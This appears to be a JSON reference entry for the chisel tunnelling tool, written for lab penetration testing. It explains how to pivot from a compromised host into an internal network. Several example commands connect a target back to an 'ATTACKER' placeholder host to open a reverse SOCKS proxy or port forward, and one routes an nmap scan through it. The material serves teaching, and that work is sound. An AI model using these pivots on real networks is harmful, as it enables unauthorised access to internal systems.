@@ -1,0 +1,153 @@
+{
+ "name": "chisel",
+ "section": "1",
+ "one_line": "fast TCP/UDP tunnel over HTTP (for pivoting)",
+ "plain": [
+  "`chisel` makes a tunnel through a firewall: a server listens on one machine and a client on another connects to it over plain HTTP, then forwards ports through that single connection. In a lab this is the usual way to reach an internal network from a machine you have already compromised (a pivot).",
+  "Think of it as one outbound connection that carries many ports. The most common pattern: your Kali machine runs the server, the compromised box runs the client and offers its inside network as a SOCKS proxy that you use with proxychains."
+ ],
+ "when": [
+  "Reach a service that listens only on localhost of a compromised host.",
+  "Browse or scan an internal network through a foothold.",
+  "Get through a firewall that only allows outbound web traffic.",
+  "Forward a port in either direction."
+ ],
+ "examples": [
+  {
+   "title": "Server on your machine",
+   "cmd": "chisel server -p 8000 --reverse",
+   "explain": "Listen on port 8000 and allow clients to open ports on YOUR machine (--reverse)."
+  },
+  {
+   "title": "Client on the target: SOCKS proxy",
+   "cmd": "./chisel client ATTACKER:8000 R:socks",
+   "explain": "R:socks opens a SOCKS5 proxy on your machine (port 1080 by default) that exits from the target's network."
+  },
+  {
+   "title": "Use the proxy",
+   "cmd": "proxychains4 -q nmap -sT -Pn -p 22,80,445 10.10.10.50",
+   "explain": "proxychains sends the scan through the SOCKS tunnel. Use TCP connect scans (-sT): SYN and ping scans do not work through SOCKS."
+  },
+  {
+   "title": "Forward one port back to you",
+   "cmd": "./chisel client ATTACKER:8000 R:8080:127.0.0.1:80",
+   "explain": "Opens port 8080 on your machine that leads to port 80 on the target's own localhost."
+  },
+  {
+   "title": "Forward one port the other way",
+   "cmd": "chisel client TARGET:8000 9000:10.10.10.9:3389",
+   "explain": "Without R, the client opens a local port 9000 that leads, through the server, to 10.10.10.9:3389."
+  },
+  {
+   "title": "Password-protect the server",
+   "cmd": "chisel server -p 8000 --reverse --auth user:S3cret",
+   "explain": "Stops anyone else on the network from using your tunnel. Give the client --auth user:S3cret."
+  },
+  {
+   "title": "Check connectivity",
+   "cmd": "chisel client -v ATTACKER:8000 R:socks",
+   "explain": "-v prints what the client is doing: useful when it will not connect."
+  }
+ ],
+ "options": [
+  {
+   "flag": "server",
+   "plain": "Run in server mode.",
+   "use": "On the machine you control."
+  },
+  {
+   "flag": "client",
+   "plain": "Run in client mode.",
+   "use": "On the other machine."
+  },
+  {
+   "flag": "-p, --port PORT",
+   "plain": "Server: listening port (default 8080).",
+   "use": "Choosing the port."
+  },
+  {
+   "flag": "--host HOST",
+   "plain": "Server: interface to listen on.",
+   "use": "Binding to one address."
+  },
+  {
+   "flag": "--reverse",
+   "plain": "Server: allow clients to ask for remote (reverse) port forwards.",
+   "use": "Pivoting from a foothold."
+  },
+  {
+   "flag": "--socks5",
+   "plain": "Server: allow clients to open a SOCKS5 proxy.",
+   "use": "SOCKS use."
+  },
+  {
+   "flag": "--auth USER:PASS",
+   "plain": "Server and client: credentials.",
+   "use": "Protect the tunnel."
+  },
+  {
+   "flag": "--authfile FILE",
+   "plain": "Server: file of allowed users.",
+   "use": "Several users."
+  },
+  {
+   "flag": "--keepalive DURATION",
+   "plain": "Keep the connection alive.",
+   "use": "Flaky networks."
+  },
+  {
+   "flag": "--fingerprint FP",
+   "plain": "Client: check the server's key fingerprint.",
+   "use": "Avoid a man-in-the-middle."
+  },
+  {
+   "flag": "--proxy URL",
+   "plain": "Client: connect through an upstream HTTP proxy.",
+   "use": "Corporate proxies."
+  },
+  {
+   "flag": "--max-retry-count N",
+   "plain": "Client: how many times to retry.",
+   "use": "Unreliable links."
+  },
+  {
+   "flag": "R:PORT:HOST:PORT",
+   "plain": "Remote forward: listen on the SERVER side and send to HOST:PORT from the client side.",
+   "use": "Reaching an internal service."
+  },
+  {
+   "flag": "PORT:HOST:PORT",
+   "plain": "Local forward: listen on the CLIENT side and send to HOST:PORT from the server side.",
+   "use": "Reaching a service behind the server."
+  },
+  {
+   "flag": "R:socks / socks",
+   "plain": "SOCKS5 proxy on the server side (reverse) or client side (forward).",
+   "use": "Whole-network pivots."
+  },
+  {
+   "flag": "-v",
+   "plain": "Verbose.",
+   "use": "Debugging."
+  },
+  {
+   "flag": "--version / -h",
+   "plain": "Version / help.",
+   "use": "Check which build is on the target."
+  }
+ ],
+ "mistakes": [
+  "Forgetting --reverse on the server when the client uses an R: remote.",
+  "Building the client for the wrong operating system or architecture (it is a single static binary: download the right one).",
+  "Using SYN scans or ping through a SOCKS proxy: use -sT -Pn.",
+  "Leaving a tunnel open without --auth on a shared network."
+ ],
+ "try": [
+  "In two VMs, run the server on one and a client on the other and forward a web server's port.",
+  "Open an R:socks tunnel and scan a lab subnet with proxychains.",
+  "Time the difference between a local forward and a SOCKS pivot."
+ ],
+ "see_also": "proxychains4(1), ssh(1) (-L, -R, -D), socat(1), ligolo-ng, sshuttle, nmap(1).",
+ "captured_with": "Examples are written to explain a technique; they are not captured output.",
+ "partial": true
+}
